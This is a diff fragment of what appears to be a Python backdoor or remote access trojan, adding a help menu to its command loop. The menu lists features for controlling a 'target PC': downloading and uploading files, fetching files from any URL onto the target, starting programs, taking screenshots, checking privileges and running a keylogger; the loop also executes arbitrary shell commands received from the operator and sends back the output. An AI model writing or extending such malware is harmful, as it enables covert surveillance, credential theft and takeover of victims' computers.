@@ -5,7 +5,7 @@ import json
 import time
 import os
 import shutil # screenshot
-import sys # use in copy function 
+import sys # use in copy function
 import base64
 import requests
 import ctypes
@@ -122,6 +122,19 @@ def shell():
 				reliable_send(admin)
 			except:
 				reliable_send("Can't Perform")
+		elif command[:4] == "help":
+			help_options = """
+			download path           -> Download from target PC
+			upload  path            -> Upload A file to Target PC
+			get url                 -> Download File to the target from any website
+			start path              -> Start Program on target PC
+			screenshot              -> Take A screenshot
+			check                   -> Check for Privileges
+			key_start               -> Start log
+			key_dump                -> print out log
+			q                       -> Exit the Program
+			"""
+			reliable_send(help_options)
 		else:
 			try:
 				process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
